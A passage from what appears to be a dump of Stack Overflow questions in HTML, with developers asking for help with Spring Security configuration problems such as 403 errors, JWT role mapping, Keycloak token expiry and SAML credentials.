            .roles(&quot;admin&quot;)
            .build();

        return new InMemoryUserDetailsManager(userDetails);
    }
}
</code></pre>
<p>This configuration doesn't work and gives 403 Forbidden on admin endpoints. I tried to use different approaches with <code>requestMatchers(admin).authorize</code>, <code>csrf.disabled</code> and without <code>userDetailsService </code>and it's the same results - I either secure all endpoints or open them all or get 403 for admin ones.</p>
<p>I tried to search some basic auth methods, but I could only find complex ones with users and roles.</p>
"
"<p>I'm attempting to use expression based access control in Spring security by referencing a bean method in my web security expression. So for example I have something like this</p>
<pre><code>@Component
public class AuthorizationChecker {
    public boolean check(Authentication authentication, HttpServletRequest request) {
        return true;
    }
}
</code></pre>
<p>And then security configure method like this</p>
<pre><code>@Override
protected void configure(HttpSecurity http) throws Exception {
    http.cors().and().anonymous().disable().authorizeRequests().antMatchers(HttpMethod.POST, &quot;/**&quot;)
            .access(&quot;@authorizationChecker(authentication, request)&quot;).and().oauth2ResourceServer().jwt();
}
</code></pre>
<p>However when starting the Spring Boot application I get Parsing exception. Digging through the Spring code I can see it fails parsing with the following message</p>
<blockquote>
<p>EL1041E: After parsing a valid expression, there is still more data in the expression: 'lparen(()'</p>
</blockquote>
<p>Any ideas? As far as I can see it matches the syntax given in the Spring Security documentation.</p>
<p><a href=""https://docs.spring.io/spring-security/reference/5.7/servlet/authorization/expression-based.html#el-access-web-beans"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-security/reference/5.7/servlet/authorization/expression-based.html#el-access-web-beans</a></p>
"
"<p>We have a spring boot application used as a resource server. Our client would like to restrain access to a certain list of users contained in a database.</p>
<p>Right now, anyone can access the application if they login to the issuer (which is public). I would like to link a role to each user, especially the one present in my database.</p>
<p>I've been trying to follow <a href=""https://stackoverflow.com/questions/69100420/spring-oauth2-resource-server-load-synchronized-user-from-database"">this</a> solution, but I would like to only call the database the first time.</p>
<p>The JWT converter :</p>
<pre><code>@Override
public AbstractAuthenticationToken convert(@NotNull final Jwt jwt) {
    Authentication auth = SecurityContextHolder.getContext().getAuthentication();
    if (Objects.isNull(auth)){
        List&lt;GrantedAuthority&gt; authorities = new ArrayList&lt;&gt;();
        if(Objects.nonNull(userController)){
            CollectionModel&lt;User&gt; userList = /* Getting info from DB here */
            if(!userList.getContent().isEmpty()){
                User user = userList.getContent().iterator().next();
                authorities.add(new SimpleGrantedAuthority(&quot;ROLE_&quot; + user.getRole().name().toUpperCase()));
            }
        } else {
            authorities.add(new SimpleGrantedAuthority(&quot;ROLE_CONSULT&quot;));
        }
        AbstractAuthenticationToken newAuth = new JwtAuthenticationToken(jwt, authorities);
        SecurityContextHolder.getContext().setAuthentication(newAuth);
        return newAuth;
    }
    return new JwtAuthenticationToken(jwt, auth.getAuthorities());
}
</code></pre>
<p>Security config</p>
<pre><code>http.authorizeRequests( authori -&gt; authori.antMatchers( &quot;URL_1&quot;, &quot;URL_2&quot; )
                .authenticated())
        .oauth2ResourceServer(oauth2 -&gt; oauth2
                .jwt(jwt -&gt; jwt
                        .jwtAuthenticationConverter(new JwtConverter())
                )
        );
</code></pre>
<p>The problem is that every time a request is made, <code>getAuthentication()</code> returns null, as if no authentication was found.
I'm fairly new to Spring, so I might not understand everything yet, especially for the security part.</p>
<p>Did anyone encounter this and if so, how did you get through ?</p>
<p>Thanks !</p>
"
"<p>Spring boot 3.2.2 + Webflux Security</p>
<p>I tried to build custom @PreAuthorize via ReactiveMethodSecurity.</p>
<p>This code check user's authorization about &quot;space&quot;</p>
<pre><code>@Component(value = &quot;SpaceAccess&quot;)
@RequiredArgsConstructor
@Slf4j
public class SpaceAccessValidation {

    public final Mono&lt;Boolean&gt; readable(String spaceId){
        log.info(&quot;spaceId: {}&quot;, spaceId);
        Mono&lt;Boolean&gt; access = AuthUtils.getMemberDetailsMono()
                .map(memberDetails -&gt; memberDetails.spaces()
                        .stream()
                        .anyMatch(o -&gt; StringUtils.equals(o.id(), spaceId) &amp;&amp; o.role().readable))
                .switchIfEmpty(AuthUtils.getAccessId()
                        .flatMap(accessId -&gt; compareSpaceMemberRoleLevel(spaceId, accessId, SpaceRoleType.VIEWER))
                );
        return Mono.zip(access, spaceExist(spaceId), (a, b) -&gt; a &amp;&amp; b);
    }
}
</code></pre>
<p>AuthUtils just bring principal from ReactiveSecurityContextHolder.</p>
<p>The matter is when this method has been executed by RestController passed parameter spaceId is null.</p>
<pre><code>@RestController
@RequestMapping(&quot;search/spaces/{spaceId}&quot;)
public class SearchRestController {


    @GetMapping(&quot;memos&quot;)
    @PreAuthorize(&quot;@SpaceAccess.readable(#spaceId)&quot;)
    @ResponseStatus(HttpStatus.OK)
    public Mono&lt;PagingResultRecord&gt; findMemos(@PathVariable(name = &quot;spaceId&quot;) String spaceId){

        //call method
    }
}
</code></pre>
<p>When I call this api SpEL #spaceId keep passing null value.</p>
<p>I think #spaceId is correct expression. do you have any idea?</p>
<p>I've checked several questions from stackoverflow and SpEL expression document.
but everywhere said when I pass the parameter dynamically #variable is correct one.</p>
"
"<p>I have created a Spring based Vaadin application and connected it to a Keycloak instance to handle the user authentication.
The application will also get an access-key from Keycloak and use it to call an API.</p>
<p>This works fine so far - the user is sent to Keycloaks login page and after authentication the application is able to make API calls using the access token.
However, I noticed that sometimes the refresh-token expires, when not doing any interaction with the application for a while.</p>
<p>My guess is that is due to the timeout settings in keycloak. When trying to interact with the Vaadin-application after expiry, I get an exception and have to restart the browser in order to login again.</p>
<p>Trying to fetch data will throw the following exception:</p>
<pre><code>org.springframework.security.oauth2.client.ClientAuthorizationException: [invalid_grant] Token is not active
    at org.springframework.security.oauth2.client.RefreshTokenOAuth2AuthorizedClientProvider.getTokenResponse(RefreshTokenOAuth2AuthorizedClientProvider.java:105) ~[spring-security-oauth2-client-6.2.1.jar:6.2.1]
    Suppressed: reactor.core.publisher.FluxOnAssembly$OnAssemblyException: 
Error has been observed at the following site(s):
    *__checkpoint ⇢ Request to GET http://127.0.0.1:8085/secure [DefaultWebClient]
Original Stack Trace:
        at org.springframework.security.oauth2.client.RefreshTokenOAuth2AuthorizedClientProvider.getTokenResponse(RefreshTokenOAuth2AuthorizedClientProvider.java:105) ~[spring-security-oauth2-client-6.2.1.jar:6.2.1]
        at org.springframework.security.oauth2.client.RefreshTokenOAuth2AuthorizedClientProvider.authorize(RefreshTokenOAuth2AuthorizedClientProvider.java:93) ~[spring-security-oauth2-client-6.2.1.jar:6.2.1]
        at org.springframework.security.oauth2.client.DelegatingOAuth2AuthorizedClientProvider.authorize(DelegatingOAuth2AuthorizedClientProvider.java:71) ~[spring-security-oauth2-client-6.2.1.jar:6.2.1]
        at org.springframework.security.oauth2.client.web.DefaultOAuth2AuthorizedClientManager.authorize(DefaultOAuth2AuthorizedClientManager.java:176) ~[spring-security-oauth2-client-6.2.1.jar:6.2.1]
        at org.springframework.security.oauth2.client.web.reactive.function.client.ServletOAuth2AuthorizedClientExchangeFilterFunction.lambda$authorizeClient$22(ServletOAuth2AuthorizedClientExchangeFilterFunction.java:486) ~[spring-security-oauth2-client-6.2.1.jar:6.2.1]
        at reactor.core.publisher.MonoSupplier.call(MonoSupplier.java:67) ~[reactor-core-3.6.2.jar:3.6.2]
        at reactor.core.publisher.FluxSubscribeOnCallable$CallableSubscribeOnSubscription.run(FluxSubscribeOnCallable.java:228) ~[reactor-core-3.6.2.jar:3.6.2]
        at reactor.core.scheduler.SchedulerTask.call(SchedulerTask.java:68) ~[reactor-core-3.6.2.jar:3.6.2]
        at reactor.core.scheduler.SchedulerTask.call(SchedulerTask.java:28) ~[reactor-core-3.6.2.jar:3.6.2]
        at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:317) ~[na:na]
        at java.base/java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:304) ~[na:na]
        at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1144) ~[na:na]
        at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:642) ~[na:na]
        at java.base/java.lang.Thread.run(Thread.java:1583) ~[na:na]
</code></pre>
<p>and</p>
<pre><code>org.springframework.security.oauth2.client.ClientAuthorizationRequiredException: [client_authorization_required] Authorization required for Client Registration Id: keycloak
    at org.springframework.security.oauth2.client.AuthorizationCodeOAuth2AuthorizedClientProvider.authorize(AuthorizationCodeOAuth2AuthorizedClientProvider.java:57) ~[spring-security-oauth2-client-6.2.1.jar:6.2.1]
    Suppressed: reactor.core.publisher.FluxOnAssembly$OnAssemblyException: 
Error has been observed at the following site(s):
    *__checkpoint ⇢ Request to GET http://127.0.0.1:8085/analysis/8 [DefaultWebClient]
Original Stack Trace:
        at org.springframework.security.oauth2.client.AuthorizationCodeOAuth2AuthorizedClientProvider.authorize(AuthorizationCodeOAuth2AuthorizedClientProvider.java:57) ~[spring-security-oauth2-client-6.2.1.jar:6.2.1]
        at org.springframework.security.oauth2.client.DelegatingOAuth2AuthorizedClientProvider.authorize(DelegatingOAuth2AuthorizedClientProvider.java:71) ~[spring-security-oauth2-client-6.2.1.jar:6.2.1]
        at org.springframework.security.oauth2.client.web.DefaultOAuth2AuthorizedClientManager.authorize(DefaultOAuth2AuthorizedClientManager.java:176) ~[spring-security-oauth2-client-6.2.1.jar:6.2.1]
        at org.springframework.security.oauth2.client.web.reactive.function.client.ServletOAuth2AuthorizedClientExchangeFilterFunction.lambda$authorizeClient$22(ServletOAuth2AuthorizedClientExchangeFilterFunction.java:486) ~[spring-security-oauth2-client-6.2.1.jar:6.2.1]
        at reactor.core.publisher.MonoSupplier.call(MonoSupplier.java:67) ~[reactor-core-3.6.2.jar:3.6.2]
        at reactor.core.publisher.FluxSubscribeOnCallable$CallableSubscribeOnSubscription.run(FluxSubscribeOnCallable.java:228) ~[reactor-core-3.6.2.jar:3.6.2]
        at reactor.core.scheduler.SchedulerTask.call(SchedulerTask.java:68) ~[reactor-core-3.6.2.jar:3.6.2]
        at reactor.core.scheduler.SchedulerTask.call(SchedulerTask.java:28) ~[reactor-core-3.6.2.jar:3.6.2]
        at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:317) ~[na:na]
        at java.base/java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:304) ~[na:na]
        at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1144) ~[na:na]
        at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:642) ~[na:na]
        at java.base/java.lang.Thread.run(Thread.java:1583) ~[na:na]
    Suppressed: java.lang.Exception: #block terminated with an error
</code></pre>
<p>The SecurityConfiguration looks like this:</p>
<pre><code>@EnableWebSecurity
@Configuration
public class SecurityConfiguration extends VaadinWebSecurity {

    private final KeycloakLogoutHandler keycloakLogoutHandler;

    public SecurityConfiguration(KeycloakLogoutHandler keycloakLogoutHandler) {
        this.keycloakLogoutHandler = keycloakLogoutHandler;
    }

    @Override
    protected void configure(HttpSecurity http) throws Exception {

        http.authorizeHttpRequests(
                authorize -&gt; authorize.requestMatchers(new AntPathRequestMatcher(&quot;/images/*.png&quot;)).permitAll());

        // Icons from the line-awesome addon
        http.authorizeHttpRequests(authorize -&gt; authorize
                .requestMatchers(new AntPathRequestMatcher(&quot;/line-awesome/**/*.svg&quot;)).permitAll());

        http.oauth2Login(Customizer.withDefaults()).logout( logout -&gt;
                logout.addLogoutHandler(keycloakLogoutHandler)
        );

        http.oauth2Client(Customizer.withDefaults());

        super.configure(http);

        setOAuth2LoginPage(http, &quot;/oauth2/authorization/keycloak&quot;);
    }

    @Bean
    public GrantedAuthoritiesMapper userAuthoritiesMapperForKeycloak() {
        return authorities -&gt; {
            Set&lt;GrantedAuthority&gt; mappedAuthorities = new HashSet&lt;&gt;();
            var authority = authorities.iterator().next();
            if (authority instanceof OidcUserAuthority oidcUserAuthority) {
                var userInfo = oidcUserAuthority.getUserInfo();
                if (userInfo.hasClaim(&quot;realm_access&quot;)) {
                    var realmAccess = userInfo.getClaimAsMap(&quot;realm_access&quot;);
                    var roles = (Collection&lt;String&gt;) realmAccess.get(&quot;roles&quot;);
                    mappedAuthorities.addAll(roles.stream()
                            .map(role -&gt; new SimpleGrantedAuthority(&quot;ROLE_&quot; + role.toUpperCase()))
                            .toList());
                }
            }
            return mappedAuthorities;
        };
    }
}
</code></pre>
<p>I created a WebClientConfig to contain the necessary information and to set the Authentication:</p>
<pre><code>@Configuration
public class WebClientConfig {

    @Bean
    public WebClient webClient(OAuth2AuthorizedClientManager authorizedClientManager) {
        ServletOAuth2AuthorizedClientExchangeFilterFunction filter =
                new ServletOAuth2AuthorizedClientExchangeFilterFunction(authorizedClientManager);
        return WebClient.builder()
                .apply(filter.oauth2Configuration())
                .baseUrl(&quot;http://127.0.0.1:8085&quot;)
                .build();
    }
}
</code></pre>
<p>And I am able to use it like that:</p>
<pre><code>
@Service
public class ApiClient {

    private final WebClient webClient;

    @Autowired
    public ApiClient(WebClient webClient) {
        this.webClient = webClient;
    }

    public ResponseEntity&lt;String&gt; fetchDataFromRestEndpoint() {
        return webClient.get()
                .uri(&quot;http://127.0.0.1:8085/secure&quot;)        
                //setting clientRegistrationId manually 
                .attributes(clientRegistrationId(&quot;keycloak&quot;))
                .retrieve()
                .toEntity(String.class)
                .block();

    }
}
</code></pre>
<p>(I had to manually set the clientRegistrationId, even though Springs docs said that this would not be necessary since information should be derived from the logged in user: <a href=""https://docs.spring.io/spring-security/reference/servlet/oauth2/index.html#oauth2-client-access-protected-resources-current-user"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-security/reference/servlet/oauth2/index.html#oauth2-client-access-protected-resources-current-user</a>)</p>
<p>Now to my questions:</p>
<ol>
<li>Why do I have to manually set the clientRegistrationId in my webclient? Did I misconfigure something, so that the &quot;automatic&quot; detection doesn't work?</li>
<li>And more important: How should I handle the token-timeout? Probably the user should be redirected to the login page. How could I configure that?</li>
</ol>
"
"<p>I started learning spring security 6 and i configured the security class, but i'm not able to access the custom login form, getting blank page but when i remove authorizeHttpRequests i'm able to access the custom login form</p>
<ul>
<li>spring boot version - 3</li>
<li>spring security version - 6.2</li>
</ul>
<pre class=""lang-java prettyprint-override""><code>package com.nikhil.springBoot.configuration;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.dao.DaoAuthenticationProvider;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.util.matcher.AntPathRequestMatcher;


@Configuration
@EnableWebSecurity
public class MyWebSecurityClass {
    @Autowired
    private UserDetailsService userDetailsService;

    @Bean
    public AuthenticationProvider authProvider() {
        DaoAuthenticationProvider provider = new DaoAuthenticationProvider();
        provider.setUserDetailsService(userDetailsService);
        provider.setPasswordEncoder(new BCryptPasswordEncoder());
        return provider;
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(c -&gt; c.disable())
            .authorizeHttpRequests(request -&gt; request
                .anyRequest().authenticated())
            .formLogin(login -&gt; login
                .loginPage(&quot;/login&quot;)
                .usernameParameter(&quot;email&quot;)
                .passwordParameter(&quot;password&quot;))
            .logout((logout) -&gt;   logout.invalidateHttpSession(true).clearAuthentication(true)
                .logoutRequestMatcher(new AntPathRequestMatcher(&quot;/logout&quot;))
                .logoutSuccessUrl(&quot;/logout-success&quot;));
        return http.build();
    }
}
</code></pre>
<p><strong>login.jsp</strong></p>
<pre class=""lang-html prettyprint-override""><code>&lt;body&gt;
    &lt;div class=&quot;container&quot;&gt;
        ${SPRING_SECURITY_LAST_EXCEPTION.message }
        &lt;div class=&quot;form&quot;&gt;
            &lt;form class=&quot;form&quot; action=&quot;login&quot; method=&quot;POST&quot; &gt;
                &lt;h2&gt;Login Form&lt;/h2&gt;

                &lt;label for=&quot;email&quot;&gt;Email Address:&lt;/label&gt;
                &lt;input type=&quot;email&quot; name=&quot;email&quot; required /&gt;

                &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;
                &lt;input type=&quot;password&quot; name=&quot;password&quot; required /&gt;

                &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;
            &lt;/form&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/body&gt;
</code></pre>
<p><strong>Controller class</strong></p>
<pre class=""lang-java prettyprint-override""><code>package com.nikhil.springBoot.controller;

import java.security.Principal;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

import com.nikhil.springBoot.dto.UserDTO;
import com.nikhil.springBoot.service.UserService;

@Controller
public class UserController {
    @Autowired
    UserDetailsService userDetailsService;

    @Autowired
    private UserService userService;
    
    @GetMapping(&quot;/&quot;)
    public ModelAndView home(ModelAndView mav) {
        mav.addObject(&quot;message&quot;, &quot;Welcome Aliens&quot;);
        mav.setViewName(&quot;welcome&quot;);
        return mav;
    }

    @GetMapping(&quot;registration&quot;)
    public ModelAndView registerPage(ModelAndView mav, UserDTO userDto, @ModelAttribute(&quot;message&quot;) String message) {
        mav.addObject(&quot;user&quot;, userDto);
        mav.addObject(&quot;message&quot;, message);
        mav.setViewName(&quot;register&quot;);
        return mav;
    }

    @PostMapping(&quot;registerUser&quot;)
    public ModelAndView saveUser(ModelAndView mav, @ModelAttribute UserDTO user, RedirectAttributes redirectAttribute) {
        userService.saveUser(user);
        redirectAttribute.addFlashAttribute(&quot;message&quot;, &quot;User registered successfully...&quot;);
        mav.setViewName(&quot;redirect:/registration&quot;);
        return mav;
    }
    
    @RequestMapping(&quot;/login&quot;)
    public String login() {
        return &quot;login&quot;;
    }
    
    @RequestMapping(&quot;/logout-success&quot;)
    public String logout() {
        return &quot;login&quot;;
    }
}
</code></pre>
"
"<p>At present I can filter or authenticate incoming requests based of path patterns. But wanted to match it with incoming host.</p>
<p>http://localhost:8080/path</p>
<div class=""s-table-container""><table class=""s-table"">
<thead>
<tr>
<th>Scheme</th>
<th>Host</th>
<th>Path</th>
</tr>
</thead>
<tbody>
<tr>
<td>http://</td>
<td>localhost:8080/</td>
<td>demo</td>
</tr>
</tbody>
</table></div>
<p>To match path patterns like /get or any we have simple funtion as below</p>
<pre><code>.pathMatchers(autPatterns).permitAll()
.pathMatchers(securePatterns).authenticated()
</code></pre>
<p>But to match header attributes or host there is no straight forward way and need to know how to create a custom matcher.</p>
<pre><code>.anyExchange(exch -&gt; matcherForHost).authenticated()
</code></pre>
<pre><code>package org.demo;

import java.security.Key;
import java.util.List;

import javax.crypto.spec.SecretKeySpec;
import javax.xml.bind.DatatypeConverter;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.security.config.annotation.web.reactive.EnableWebFluxSecurity;
import org.springframework.security.config.web.server.SecurityWebFiltersOrder;
import org.springframework.security.config.web.server.ServerHttpSecurity;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.web.server.SecurityWebFilterChain;
import org.springframework.security.web.server.authentication.AuthenticationWebFilter;

import io.jsonwebtoken.SignatureAlgorithm;

import org.springframework.security.web.server.util.matcher.AndServerWebExchangeMatcher;
import org.springframework.security.web.server.util.matcher.MediaTypeServerWebExchangeMatcher;
import org.springframework.security.web.server.util.matcher.ServerWebExchangeMatcher;
import org.springframework.security.web.server.util.matcher.ServerWebExchangeMatchers;
import reactor.core.publisher.Mono;

@Configuration
@EnableWebFluxSecurity
public class SecurityConfig{

    @Bean
    SecurityWebFilterChain springWebFilterChain(@Autowired ServerHttpSecurity http, @Autowired AuthenticationManager authenticationManager, @Autowired SecurityContextRepository securityContextRepository) {
        String[] autPatterns = new String[]{&quot;/demo/auth/**&quot;};
        String[] securePatterns = new String[]{&quot;/demo/**&quot;};
        List&lt;String&gt; secureHosts = List.of(&quot;.*localhost.*&quot;, &quot;.*local\\.com.*&quot;);


        return http.cors().disable()
                .exceptionHandling()
                .authenticationEntryPoint((s, e) -&gt; Mono.fromRunnable(() -&gt;
                        s.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED)
                )).accessDeniedHandler((s, e) -&gt; Mono.fromRunnable(() -&gt;
                        s.getResponse().setStatusCode(HttpStatus.FORBIDDEN)
                )).and()
                .csrf().disable()
                .authenticationManager(authenticationManager)
                .securityContextRepository(securityContextRepository)
                .authorizeExchange()
                .pathMatchers(autPatterns).permitAll()
                .pathMatchers(securePatterns).authenticated()
                .anyExchange().permitAll()
//              .anyExchange(exch -&gt; authenticate).authenticated()
                .and()
                .build();
    }

}
</code></pre>
"
"<p>I recently encountered a vulnerability in my Maven project while adding a dependency to my pom.xml. The vulnerability is reported as CVE-2023-2976 with a severity level of High, indicating a &quot;Files or Directories Accessible to External Parties&quot; vulnerability. The problematic dependency is com.google.guava:guava:31.1-jre.</p>
<p>Here are the specifics of my project setup:</p>
<ul>
<li>Spring Boot version: 3.2.2</li>
<li>Spring Security version: 6.2.1</li>
</ul>
<p>I attempted to mitigate the vulnerability by excluding the problematic dependency as follows:</p>
<pre class=""lang-xml prettyprint-override""><code>&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
    &lt;artifactId&gt;spring-security-saml2-service-provider&lt;/artifactId&gt;
    &lt;exclusions&gt;
        &lt;exclusion&gt;
            &lt;groupId&gt;org.opensaml&lt;/groupId&gt;
            &lt;artifactId&gt;opensaml-core&lt;/artifactId&gt;
        &lt;/exclusion&gt;
    &lt;/exclusions&gt;
&lt;/dependency&gt;
</code></pre>
<p>but the problem still exist</p>
"
"<p>I am working on spring security application and I am trying to create two UserDetailsService but it's working as expected.
My Security config file is as below:</p>
<pre><code>@Configuration
@EnableWebSecurity
@RequiredArgsConstructor
public class SecurityConfig {
    private final AdminDetailsService adminDetailsService;
    private final DeptAdminDetailService deptAdminDetailsService;
    private final AuthenticationConfiguration authenticationConfiguration;

    @Bean
    protected SecurityFilterChain configure(HttpSecurity http) throws Exception {
        AdminAuthenticationFilter adminAuthFilter = new AdminAuthenticationFilter(authenticationManagerBean(authenticationConfiguration), adminDetailsService);
        DeptAdminAuthenticationFilter deptAuthFilter = new DeptAdminAuthenticationFilter(authenticationManagerBean(authenticationConfiguration), deptAdminDetailsService);

        AuthenticationManagerBuilder authenticationManagerBuilder = http
                .getSharedObject(AuthenticationManagerBuilder.class);

        authenticationManagerBuilder
                .userDetailsService(adminDetailsService);

        authenticationManagerBuilder
                .userDetailsService(deptAdminDetailsService);

        AuthenticationManager authenticationManager = authenticationManagerBuilder.build();


        http.csrf(AbstractHttpConfigurer::disable)
                .cors(Customizer.withDefaults())
                .authenticationManager(authenticationManager)
                .sessionManagement(sessionManagement -&gt; sessionManagement.sessionCreationPolicy(STATELESS))
                .authorizeHttpRequests(auth -&gt; auth
                        .requestMatchers(&quot;/token/refresh/**&quot;).permitAll()
                        .requestMatchers(&quot;/users/encoded-password&quot;).permitAll()
                        .anyRequest().authenticated()
                )
                .addFilter(adminAuthFilter)
                .addFilter(deptAuthFilter)
                .addFilterBefore(new TokenAuthorizationFilter(), UsernamePasswordAuthenticationFilter.class);

        return http.build();
    }



    @Bean
    public AuthenticationManager authenticationManagerBean(AuthenticationConfiguration authenticationConfiguration) throws Exception {
        try {
            return authenticationConfiguration.getAuthenticationManager();
        } catch (Exception e){
            e.printStackTrace();
            return  null;
        }
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
</code></pre>
<p>here I am defining 2 UserServiceDeatils implementation class AdminDetailsService and  DeptAdminDetailService so I have 2 login one for super admin and one for department admin and I have 2 separate tables for it.</p>
<p>And here is the Admin Authentication Filter class:</p>
<pre><code>@Slf4j
public class AdminAuthenticationFilter extends UsernamePasswordAuthenticationFilter {
    private final AuthenticationManager authenticationManager;
    private final AdminDetailsService adminDetailsService;

    public AdminAuthenticationFilter(AuthenticationManager authenticationManager, AdminDetailsService adminDetailsService) {
        this.authenticationManager = authenticationManager;
        this.adminDetailsService = adminDetailsService;


        setFilterProcessesUrl(&quot;/admin/login&quot;);
    }

    @Override
    public Authentication attemptAuthentication(HttpServletRequest request, HttpServletResponse response) throws AuthenticationException {
        String username = request.getParameter(&quot;username&quot;);
        String password = request.getParameter(&quot;password&quot;);
        
        UsernamePasswordAuthenticationToken authToken = new UsernamePasswordAuthenticationToken(username, password);

        return authenticationManager.authenticate(authToken);
    }



    @Override
    protected void successfulAuthentication(HttpServletRequest request, HttpServletResponse response, FilterChain chain, Authentication authentication) throws IOException, ServletException {
        User user = (User) authentication.getPrincipal();
        String username = user.getUsername();
        String issuer = request.getRequestURL().toString();
        Map&lt;String, String&gt; tokens = TokenUtils.getTokenHeaders(username, issuer, user.getAuthorities());
        response.setContentType(MediaType.APPLICATION_JSON_VALUE);
        new ObjectMapper().writeValue(response.getOutputStream(), tokens);
    }

    @Override
    protected void unsuccessfulAuthentication(HttpServletRequest request, HttpServletResponse response, AuthenticationException failed) throws IOException {
        throw new BadRequestException(&quot;Name or username is invalid. Please, try again.&quot;);
    }

}
</code></pre>
<p>Dept Admin Authentication Filter class:</p>
<pre><code>@Slf4j
public class DeptAdminAuthenticationFilter extends UsernamePasswordAuthenticationFilter {
    private final AuthenticationManager authenticationManager;
    private final DeptAdminDetailService deptAdminDetailService;

    public DeptAdminAuthenticationFilter(AuthenticationManager authenticationManager, DeptAdminDetailService deptAdminDetailService) {
        this.authenticationManager = authenticationManager;
        this.deptAdminDetailService = deptAdminDetailService;

        setFilterProcessesUrl(&quot;/dept/login&quot;);
    }

    @Override
    public Authentication attemptAuthentication(HttpServletRequest request, HttpServletResponse response) throws AuthenticationException {
        String username = request.getParameter(&quot;username&quot;);
        String password = request.getParameter(&quot;password&quot;);

        UsernamePasswordAuthenticationToken authToken = new UsernamePasswordAuthenticationToken(username, password);

        return authenticationManager.authenticate(authToken);
    }

    @Override
    protected void successfulAuthentication(HttpServletRequest request, HttpServletResponse response, FilterChain chain, Authentication authentication) throws IOException, ServletException {
        User user = (User) authentication.getPrincipal();
        String username = user.getUsername();
        String issuer = request.getRequestURL().toString();
        Map&lt;String, String&gt; tokens = TokenUtils.getTokenHeaders(username, issuer, user.getAuthorities());
        response.setContentType(MediaType.APPLICATION_JSON_VALUE);
        new ObjectMapper().writeValue(response.getOutputStream(), tokens);
    }
}
</code></pre>
<p>But when I trying to authenticate it gives below error:</p>
<pre><code>java.lang.StackOverflowError: null
at java.base/java.lang.Exception.&lt;init&gt;(Exception.java:103) ~[na:na]
at java.base/java.lang.ReflectiveOperationException.&lt;init&gt;(ReflectiveOperationException.java:90) ~[na:na]
at java.base/java.lang.reflect.InvocationTargetException.&lt;init&gt;(InvocationTargetException.java:67) ~[na:na]
at jdk.internal.reflect.GeneratedMethodAccessor19.invoke(Unknown Source) ~[na:na]
at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]
at java.base/java.lang.reflect.Method.invoke(Method.java:568) ~[na:na]
at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:242) ~[spring-aop-6.1.2.jar:6.1.2]
at jdk.proxy2/jdk.proxy2.$Proxy122.authenticate(Unknown Source) ~[na:na]
</code></pre>
<p>Here I am not providing AdminDetailsService and DeptAdminDetailService as it just implement UserDetailsService and overriding this method  loadUserByUsername
Please help what configuration am I missing?</p>
"
"<p>I am trying to add a private key to my security configuration in Spring Boot.</p>
<pre><code>@Bean
    protected RelyingPartyRegistrationRepository relyingPartyRegistrations() throws Exception {
        URI assertingUri = getClass().getClassLoader().getResource(&quot;asserting_party_public.crt&quot;).toURI();
        URI relyingUri = getClass().getClassLoader().getResource(&quot;relying_private_key.pem&quot;).toURI();
        File assertingKey = Paths.get(assertingUri).toFile();
        File relyingKey = Paths.get(relyingUri).toFile();
        X509Certificate assertingCertificate = X509Support.decodeCertificate(assertingKey);
        X509Certificate relyingCertificate = X509Support.decodeCertificate(relyingKey);
        Saml2X509Credential assertingCredential = Saml2X509Credential.verification(assertingCertificate);
        Saml2X509Credential relyingCredential = Saml2X509Credential.verification(relyingCertificate);
        RelyingPartyRegistration registration = RelyingPartyRegistration
                .withRegistrationId(&quot;relying&quot;)
                .entityId(&quot;relying_entity_id&quot;)
                .signingX509Credentials((c) -&gt; c.add(relyingCredential))
                .assertionConsumerServiceLocation(&quot;https://&lt;relying_server&gt;/login/saml2/sso/&lt;relying&gt;&quot;)
                .assertingPartyDetails(idp -&gt; idp
                    .entityId(&quot;https://&lt;idp_entity_id&gt;&quot;)
                    .wantAuthnRequestsSigned(true)
                    .singleSignOnServiceLocation(&quot;https://&lt;idp_sso_location&quot;)
                    .verificationX509Credentials(c -&gt; c.add(assertingCredential))
                ).build();
